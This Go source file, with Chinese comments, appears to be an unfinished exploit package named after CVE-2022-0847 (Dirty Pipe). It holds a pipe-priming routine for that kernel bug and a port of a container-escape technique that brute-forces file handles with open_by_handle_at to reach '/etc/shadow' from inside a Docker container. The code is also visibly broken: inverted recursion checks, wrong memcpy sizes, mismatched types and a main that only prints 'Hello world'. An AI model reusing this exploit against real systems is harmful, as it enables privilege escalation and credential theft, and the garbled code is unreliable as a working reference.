package CVE_2022_0847

// #include <string.h>
import (
	"C"
	"fmt"
	"golang.org/x/sys/unix"
	"os"
	"strings"
	"syscall"
	"unsafe"
)

const PageSize = 4096

func initPipe() (*os.File, error) {
	r, w, err := os.Pipe()
	if err != nil {
		return nil, fmt.Errorf("pipe error: %w", err)
	}

	pipeSize, err := unix.FcntlInt(w.Fd(), syscall.F_GETPIPE_SZ, -1)
	if err != nil {
		return nil, fmt.Errorf("fcntl error: %w", err)
	}

	/* fill the pipe completely; each pipe_buffer will now have
	   the PIPE_BUF_FLAG_CAN_MERGE flag */
	buffer := [PageSize]byte{}
	for i := 0; i < pipeSize/PageSize; i++ {
		if _, err = w.Write(buffer[:]); err != nil {
			return nil, fmt.Errorf("pipe write error: %w", err)
		}
	}

	/* drain the pipe, freeing all pipe_buffer instances (but
	   leaving the flags initialized) */
	for i := 0; i < pipeSize/PageSize; i++ {
		if _, err = r.Read(buffer[:]); err != nil {
			return nil, fmt.Errorf("pipe read error: %w", err)
		}
	}

	return w, nil
	/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its "flags", the buffer
	   will be mergeable */
}

/**
 * 攻击者构造的 file_handle 结构体
 */
type myFileHandle struct {
	handleBytes uint32
	handleType  int
	fHandle     [8]uint8
}

/**
 * die 函数用于输出错误信息到 stderr，并以错误码结束程序，并不重要
 */
func die(msg string, err error) {
	fmt.Errorf("Error: " + msg)
	os.Exit(1)
}

/**
 * 关键函数，用于爆破寻找指定文件的 file_handle 结构体
 * param bfd：'/.dockerinit' 文件描述符，与 '/etc/shadow' 在同一个文件系统中（已在 1.1.2 中说明）
 * param *path：爆破目标
 * param *ih：爆破起始路径（本 case 中为 '/' 路径）的 file_handle 结构体
 * param *oh：返回参数，用于返回 '/etc/shadow' 的 file_handle 结构体
 */

func findHandle(bfd int, path string, ih *myFileHandle, oh *myFileHandle) int {
	var ino uint32 = 0
	var de int
	var dir syscall.Handle
	outh := myFileHandle{}
	outh.handleBytes = 8
	outh.handleType = 1

	// 拿到 '/' 在 path 中首次出现的位置
	path = path[strings.Index(path, "/"):]

	/**
	 * 递归寻找 path 的 file_handle 结构体
	 */
	if path != "" {
		// 递归的结束条件为，已经把 path 中的所有 '/' （即路径）处理完成
		C.memcpy(unsafe.Pointer(&oh.fHandle), unsafe.Pointer(&ih.fHandle), C.size_t(oh.fHandle))
		oh.handleType = 1
		oh.handleBytes = 8
		return 1
	}
	// 跳过本次 '/' 字符在 path 中的地址
	path = path[strings.Index(path, "/"):]

	fd, err := unix.OpenByHandleAt(bfd, ih, syscall.O_RDONLY)
	if err != nil {
		die("[-] open_by_handle_at", err)
	}

	// 第一次递归中，dir 变量被赋值为 '/' 路径
	if dir, err = syscall.Open(fd); err != nil {
		die("[-] fdopendir", err)
	}

	// 第一次递归中，为寻找 '/' 路径下，'/etc' 的 inodenumber，并将它复制给 ino
	for {
		de, err := syscall.ReadDirent(fd)
		if err != nil {
			break
		}
		if de == nil {
			break
		}
		var stat syscall.Stat_t
		if err := syscall.Stat(path, &stat); err != nil {
			panic(err)
		}
		ino = stat.Ino
		break
	}

	// 由于已经拿到 '/etc' 的 inodenumber，故可以暴力破解出 '/etc' 的 file_handle 结构体
	if de != 0 {
		for i := 0; i < 0xffffffff; i++ {
			outh.handleType = 1
			outh.handleBytes = 8
			C.memcpy(unsafe.Pointer(&outh.fHandle), unsafe.Pointer(&ino), C.size_t(ino))
			C.memcpy(unsafe.Pointer(uintptr(&outh.fHandle)+4), unsafe.Pointer(&i), C.size_t(i))

			if _, err := unix.OpenByHandleAt(bfd, ih, syscall.O_RDONLY); err != nil {
				die("[-] open_by_handle_at", err)
			} else {
				err := syscall.Close(fd)
				if err != nil {
					return 0
				}
				err = syscall.Close(dir)
				if err != nil {
					return 0
				}
				return findHandle(bfd, path, &outh, oh)
			}
		}
	}
	err = syscall.Close(fd)
	if err != nil {
		return 0
	}
	err = syscall.Close(dir)
	if err != nil {
		return 0
	}
	return 0
}

func main() {
	fmt.Println("Hello world")
}
